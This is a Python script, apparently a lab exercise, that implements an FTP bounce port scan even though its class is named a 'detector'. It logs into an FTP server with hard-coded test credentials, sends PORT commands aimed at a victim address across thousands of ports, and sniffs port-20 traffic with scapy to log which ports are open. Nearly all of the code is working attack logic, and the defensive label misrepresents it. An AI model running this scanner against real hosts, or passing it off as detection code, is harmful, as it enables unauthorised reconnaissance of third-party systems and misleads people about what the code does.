import threading
import socket
import time
from ftplib import FTP
from scapy.all import sniff, IP, TCP
import os

class FTPBounceAttackDetector:
    def __init__(self):
        self.victim_ip = "10.100.102.18"
        self.ftp_server_ip = "10.100.102.11"
        self.ftp_client = None
        self.open_ports_list = [0] * (2**16)
        self.flag = False
        self.scan_file = "scanfile.txt" # Ensure this path is writable

    def connect_to_ftp_server(self):
        try:
            self.ftp_client = FTP(self.ftp_server_ip)
            self.ftp_client.login("testuser1", "1234")
            print(f"Connected to FTP server: {self.ftp_server_ip}")
        except Exception as e:
            print(f"Error connecting to FTP server: {e}")
            self.ftp_client = None

    def packet_handler(self, packet):
        try:
            if IP in packet and TCP in packet:
                if packet[TCP].dport == 20 and not self.flag:
                    source_port = packet[TCP].sport
                    self.open_ports_list[source_port] += 1
                    if self.open_ports_list[source_port] > 1:
                        with open(self.scan_file, "a") as f:
                            f.write(f"found open port: {source_port}\n")
                        print(f"Found open port: {source_port}")
                        self.flag = True
        except Exception as e:
            print(f"Error handling packet: {e}")

    def sniff_packets(self):
        try:
            # Determine the correct interface name for your system
            # You might need to list available interfaces using scapy.all.ifaces()
            # For example: interfaces = scapy.all.ifaces(); print(interfaces)
            # Then replace "eth0" with the appropriate interface name
            sniff(filter="tcp and dst port 20", prn=self.packet_handler, iface="eth0", store=0)
        except Exception as e:
            print(f"Error during packet sniffing: {e}")

    def scan_port(self):
        if self.ftp_client is None:
            print("FTP client not connected. Skipping port scan.")
            return

        for p1 in range(4, 256):
            for p2 in range(1, 256):
                port = (p1 * 256) + p2
                print(f"\rScanning {self.victim_ip}:{port}", end="")
                try:
                    # Construct the PORT command
                    port_str = f"{self.victim_ip.replace('.', ',')},{p1},{p2}"
                    self.ftp_client.sendcmd(f"PORT {port_str}")
                    self.ftp_client.retrlines("NLST") # Trigger the data connection
                except Exception as e:
                    # Handle potential FTP command errors
                    pass
        print("\nPort scan finished.")

    def main(self):
        sniffer_thread = threading.Thread(target=self.sniff_packets)
        port_scanner_thread = threading.Thread(target=self.scan_port)

        self.connect_to_ftp_server()

        sniffer_thread.start()
        time.sleep(2) # Simulate the delay
        port_scanner_thread.start()

        sniffer_thread.join()
        port_scanner_thread.join()

if __name__ == "__main__":
    detector = FTPBounceAttackDetector()
    detector.main()
